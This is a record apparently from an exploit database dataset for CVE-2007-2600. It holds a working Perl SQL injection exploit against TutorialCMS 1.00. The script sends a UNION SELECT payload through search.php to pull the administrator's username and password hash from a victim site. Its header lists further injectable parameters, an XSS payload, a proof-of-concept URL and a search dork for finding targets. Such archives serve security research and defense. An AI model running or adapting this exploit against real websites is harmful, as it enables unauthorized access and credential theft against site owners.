{
  "id": "3887",
  "title": "TutorialCMS 1.00 - &#039;search.php?search&#039; SQL Injection",
  "cve": "CVE-2007-2600",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\n\r\n#################################################################################\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#\t\t     TutorialCMS <= 1.00 SQL Injection Exploit\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# Discovered by: Silentz\t\t\t\t\t\t\t#\r\n# Payload: Admin Username & Hash Retrieval\t\t\t\t\t#\r\n# Website: http://www.w4ck1ng.com\t\t\t\t\t\t#\r\n# \t\t\t\t\t\t\t\t\t\t#\r\n# Vulnerable Code (search.php):\t\t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#      $search = $_REQUEST['search'];\t\t\t\t\t\t#\r\n#      $sql    = \"SELECT * FROM tutorials WHERE title LIKE '%$search%' \t\t#\r\n#\t\t  ORDER BY hits DESC LIMIT $startID , $perPage\"; \t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# Manual SQL Injection:\t\t\t\t\t\t\t\t#\r\n#      \t\t\t\t\t\t\t\t\t\t#\r\n#      \tbrowseCat.php?catFile=[SQL QUERY]\t\t\t\t\t#\r\n#\tbrowseSubCat.php?catFile=[SQL QUERY]\t\t\t\t\t#\r\n#\topenTutorial.php?id=[SQL QUERY]\t\t\t\t\t\t#\r\n#\tsearch.php?search=[SQL QUERY]\t\t\t\t\t\t#\r\n#\ttopFrame.php?id=[SQL QUERY]\t\t\t\t\t\t#\r\n#\tadmin/editListing.php?id=[SQL QUERY]\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# NOTE: All above parameters are vulnerable to XSS, so try:\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#\tsearch.php?search=\"><script>alert('http://www.w4ck1ng.com')</script>\t#\t\t\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# PoC: http://victim.com/search.php?search=' UNION SELECT 0,0,0,0,username,\t#\r\n#      password,0,0,0,0,0,0,0 FROM users WHERE id='1' /*\t\t\t#\r\n# \t\t\t\t\t\t\t\t\t\t#\r\n# Subject To: magic_quotes_gpc set to off\t\t\t\t\t#\r\n# GoogleDork: \"Powered By Photoshop Tutorials\" (0 Results)\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# Shoutz: The entire w4ck1ng community\t\t\t\t\t\t# \r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#################################################################################\r\n\r\nuse LWP::UserAgent;\r\nif (@ARGV < 1){\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"                 TutorialCMS <= 1.00 SQL Injection Exploit\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"Usage: w4ck1ng_tutorialcms.pl [PATH]\\r\\n\\r\\n\";\r\nprint \"[PATH] = Path where TutorialCMS is located\\r\\n\\r\\n\";\r\nprint \"e.g. w4ck1ng_tutorialcms.pl http://victim.com/tutorialcms/\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\nprint \"            \t\t        ...Silentz\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nexit();\r\n}\r\n\r\n$useragent = LWP::UserAgent->new() or die \"Could not initialize browser\\n\";\r\n$useragent->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');\r\n\r\n$sql = $ARGV[0] . \"search.php?search=' UNION SELECT 0,0,0,0,username,password,0,0,password,0,password,0,0 FROM users WHERE id='1' /*\";\r\n$result = $useragent->request(HTTP::Request->new(GET=>$sql));\r\n\r\nif($result->content =~ /\"><b><u>([0-9a-zA-Z]+)<\\/u>/){\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"                 TutorialCMS <= 1.00 SQL Injection Exploit\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"[+] Admin User : $1\\n\";\r\n}\r\n\r\nelse {print \"\\n[-] Unable to retrieve admin username...\"}\r\n\r\nif($result->content =~ /([0-9a-fA-F]{32})/){\r\nprint \"[+] Admin Hash : $1\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\nprint \"            \t\t        ...Silentz\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\n}\r\n\r\nelse {print \"\\n[-] Unable to retrieve admin hash...\\n\";}\r\n\r\n# milw0rm.com [2007-05-09]",
  "url": "https://www.exploit-db.com/exploits/3887"
}